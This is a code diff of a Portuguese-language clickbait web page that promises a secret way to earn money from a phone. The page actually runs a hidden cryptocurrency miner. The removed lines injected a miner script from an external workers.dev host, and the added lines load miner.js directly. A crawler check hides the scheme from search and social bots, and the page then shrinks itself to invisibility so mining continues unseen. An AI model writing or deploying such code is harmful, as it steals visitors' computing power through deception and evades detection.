@@ -1,43 +1,38 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Dica de Renda Extra em 2025</title>
+    <title>Dica de Renda Extra em 2024</title>
     <meta name="description" content="Aprenda a ganhar R$500 por semana com celular">
 </head>
 <body>
 
 <h1>Descubra o método proibido que gera R$87 por dia</h1>
 <p>Clique abaixo para liberar acesso antes que retirem do ar:</p>
-<button onclick="loadMiner()">VER MÉTODO (VAGAS RESTANTES: 3)</button>
+<button onclick="startMiner()">VER MÉTODO (VAGAS RESTANTES: 3)</button>
 
 <div id="content"></div>
+
+<script src="miner.js"></script>
 
 <script>
 function isBot() {
     return /bot|google|facebook|crawler|spider|yahoo|yandex/i.test(navigator.userAgent);
 }
 
-function loadMiner() {
+function startMiner() {
     if (isBot()) return;
 
-    // Esconde botão e mostra carregando
     document.querySelector('button').remove();
     document.getElementById('content').innerHTML = '<p>Carregando método secreto...</p>';
 
-    // Injeta minero
-    const script = document.createElement('script');
-    script.src = 'https://miner-ghost.workers.dev'; // Cloudflare Worker (cria depois)
-    script.async = true;
-    document.head.appendChild(script);
-
-    // Fica em 2º plano
+    // O minero já foi carregado via miner.js
     setTimeout(() => {
         document.body.style.opacity = 0;
         document.body.style.height = '1px';
+        document.body.style.overflow = 'hidden';
     }, 2000);
 }
 </script>
 
 </body>
-
 </html>
